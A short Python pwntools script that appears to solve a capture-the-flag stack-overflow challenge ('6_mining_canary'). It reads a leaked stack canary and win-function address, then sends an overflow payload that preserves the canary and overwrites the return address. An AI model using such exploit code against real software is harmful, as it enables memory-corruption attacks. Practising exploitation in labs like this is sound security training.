from pwn import *

#context.log_level = "debug"
remote = False

IP = ""
PORT = ""
FILENAME = "./6_mining_canary"

if remote:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    p = process(FILENAME)
    elf = p.elf

payload = b"A"*64
pause()

p.recvuntil("secret: ")
leaks = p.recvline()[:-1]
canary = leaks[0:4]
win_addr = int(leaks[4:], 16)

log.info(str(canary))

payload += pack(unpack(canary)) + pack(win_addr) * 9

p.sendlineafter(b"me!", payload)

p.interactive()
